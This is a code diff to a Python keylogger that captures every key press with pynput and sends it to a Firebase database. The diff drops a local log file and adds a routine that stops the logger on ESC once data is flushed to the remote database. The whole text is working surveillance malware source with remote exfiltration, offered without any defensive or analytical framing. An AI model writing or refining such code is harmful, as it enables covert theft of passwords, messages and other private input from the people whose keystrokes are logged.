@@ -41,36 +41,34 @@ def write_to_database(db, key):
     except Exception as e:
         print(f"Error writing to database: {e}")
 
-# Function to insert key press information into a file
-def write_to_file(key):
-    try:
-        with open("key_log.txt", "a") as file:
-            file.write(str(key) + '\n')
-    except IOError as e:
-        print(f"Error writing to file: {e}")
+# Function to gracefully stop the keylogger and ensure all data is sent to the database
+def stop_keylogger(listener, db):
+    listener.stop()
+    listener.join()
+    print("Keylogger execution stopped. Waiting for data to be sent to the database.")
+    db.terminate()
 
 # Callback function for key press events
-def on_press(key, db):
+def on_press(key, db, listener):
     try:
         write_to_database(db, key)
-        write_to_file(key)
+        # Additional check for the ESC key to stop the keylogger
+        if key == Key.esc:
+            stop_keylogger(listener, db)
     except Exception as e:
         print(f"Error processing key: {e}")
 
 # Callback function for key release events
 def on_release(key):
-    if key == Key.esc:
-        # Stop the listener
-        print("Keylogger execution interrupted by user.")
-        return False
+    pass  # No action needed on key release
 
 if __name__ == "__main__":
     # Establish a connection to the Firebase database
     db = connect_to_database()
 
-    with Listener(on_press=lambda key: on_press(key, db),
+    with Listener(on_press=lambda key: on_press(key, db, listener),
                   on_release=on_release) as listener:
         try:
             listener.join()
         except KeyboardInterrupt:
-            print("Keylogger execution interrupted by user.")
+            stop_keylogger(listener, db)
